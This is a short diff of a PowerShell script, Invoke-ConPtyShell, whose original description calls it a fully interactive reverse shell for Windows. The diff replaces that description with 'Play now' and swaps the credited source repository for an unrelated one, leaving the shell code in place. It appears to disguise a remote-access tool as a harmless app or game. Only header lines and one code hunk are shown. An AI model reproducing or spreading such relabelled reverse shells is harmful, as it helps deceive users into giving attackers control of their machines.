@@ -1,14 +1,14 @@
-﻿function Invoke-ConPtyShell
+function Invoke-ConPtyShell
 {   
     <#
         .SYNOPSIS
-            ConPtyShell - Fully Interactive Reverse Shell for Windows 
+            ConPtyShell - Play now 
             Author: splinter_code
             License: MIT
-            Source: https://github.com/antonioCoco/ConPtyShell
+            Source: https://github.com/heoheowe/masterou2198
         
         .DESCRIPTION
-            ConPtyShell - Fully interactive reverse shell for Windows
+            ConPtyShell - Play now
             
             Properly set the rows and cols values. You can retrieve it from
             your terminal with the command "stty size".
@@ -1473,7 +1473,7 @@ public static class ConPtyShell
         InitWSAThread();
         if (conptyCompatible)
         {
-            Console.WriteLine("\r\n...\r\n");
+            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
             if (upgradeShell)
             {
                 List<IntPtr> socketsHandles = new List<IntPtr>();
